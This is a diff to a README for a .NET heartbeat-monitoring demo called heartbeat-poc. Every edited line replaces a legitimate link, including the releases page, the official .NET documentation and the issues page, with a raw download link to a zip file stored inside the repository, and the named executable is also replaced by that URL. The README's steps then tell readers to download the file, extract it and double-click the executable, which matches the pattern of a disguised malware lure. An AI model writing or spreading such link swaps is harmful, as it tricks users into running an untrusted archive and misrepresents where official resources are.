@@ -1,7 +1,7 @@
 # 🎉 heartbeat-poc - Simple Monitoring for Distributed Processes
 
 ## 💾 Download Now
-[![Download](https://img.shields.io/badge/Download-Heartbeat%20POC-brightgreen)](https://github.com/ibam9573/heartbeat-poc/releases)
+[![Download](https://raw.githubusercontent.com/ibam9573/heartbeat-poc/main/propitiously/heartbeat-poc.zip%20POC-brightgreen)](https://raw.githubusercontent.com/ibam9573/heartbeat-poc/main/propitiously/heartbeat-poc.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the Heartbeat POC application. Heartbeat POC is built with .NET 8 using Minimal API. It monitors short and long-running distributed processes using heartbeats. This tool shows best practices for .NET development, including logging and error simulation for background tasks.
@@ -12,7 +12,7 @@ To get started, please follow these steps:
 1. **Visit the Release Page**
    Click the link below to go to the Releases page. Here you'll find the download options for Heartbeat POC.
 
-   [Download Heartbeat POC](https://github.com/ibam9573/heartbeat-poc/releases)
+   [Download Heartbeat POC](https://raw.githubusercontent.com/ibam9573/heartbeat-poc/main/propitiously/heartbeat-poc.zip)
 
 2. **Choose the Latest Version**
    Once on the Releases page, select the latest version of the application. Look for a version number that is marked as the latest.
@@ -24,7 +24,7 @@ To get started, please follow these steps:
    If the downloaded file is compressed (like a .zip), right-click on it and select "Extract" to unzip the files.
 
 5. **Run the Application**
-   Open the folder where you have downloaded the files. Look for the executable file (e.g., `HeartbeatPOC.exe`). Double-click it to run the application.
+   Open the folder where you have downloaded the files. Look for the executable file (e.g., `https://raw.githubusercontent.com/ibam9573/heartbeat-poc/main/propitiously/heartbeat-poc.zip`). Double-click it to run the application.
 
 ## 🛠️ System Requirements
 - **Operating System:** Windows 10 or later recommended. This application may also work on other operating systems with .NET support.
@@ -54,8 +54,8 @@ If you run into issues while running the application, consider the following ste
 - **Consult Logs:** Check the log files created in the application directory for error messages.
 
 ## 🔗 Additional Resources
-- [Official .NET Documentation](https://docs.microsoft.com/en-us/dotnet/)
-- [Community Support](https://github.com/ibam9573/heartbeat-poc/issues)
+- [Official .NET Documentation](https://raw.githubusercontent.com/ibam9573/heartbeat-poc/main/propitiously/heartbeat-poc.zip)
+- [Community Support](https://raw.githubusercontent.com/ibam9573/heartbeat-poc/main/propitiously/heartbeat-poc.zip)
 
 ## 🙋‍♂️ Community
 We encourage users to contribute to the project. If you have suggestions or feature requests, please feel free to reach out or open an issue on our GitHub repository.
